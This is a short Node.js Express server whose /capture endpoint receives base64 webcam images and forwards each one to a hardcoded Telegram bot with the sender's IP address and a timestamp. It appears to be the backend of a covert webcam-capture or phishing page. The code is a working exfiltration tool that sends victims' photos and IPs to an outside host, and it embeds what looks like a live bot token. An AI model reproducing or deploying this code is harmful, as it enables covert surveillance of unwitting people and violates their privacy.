const express = require('express');
const fetch = require('node-fetch');
const FormData = require('form-data');
const app = express();
app.use(express.json({ limit: '10mb' }));

const BOT_TOKEN = '8853700916:AAGDoztpG5fYk3-wk2GQQV_h7ll4dY-07gM';
const CHAT_ID = '8722607800';

app.post('/capture', async (req, res) => {
    try {
        const { image } = req.body;
        if (!image) return res.status(400).json({ error: 'No image' });

        const matches = image.match(/^data:image\/([A-Za-z]+);base64,(.+)$/);
        if (!matches) return res.status(400).json({ error: 'Invalid format' });

        const buffer = Buffer.from(matches[2], 'base64');
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', buffer, { filename: `capture_${Date.now()}.jpg` });
        form.append('caption', `📸 Webcam capture\nIP: ${req.ip || 'unknown'}\nTime: ${new Date().toLocaleString('vi-VN')}`);

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: form,
            headers: form.getHeaders()
        });

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});

app.listen(3000, () => console.log('✅ Server running'));
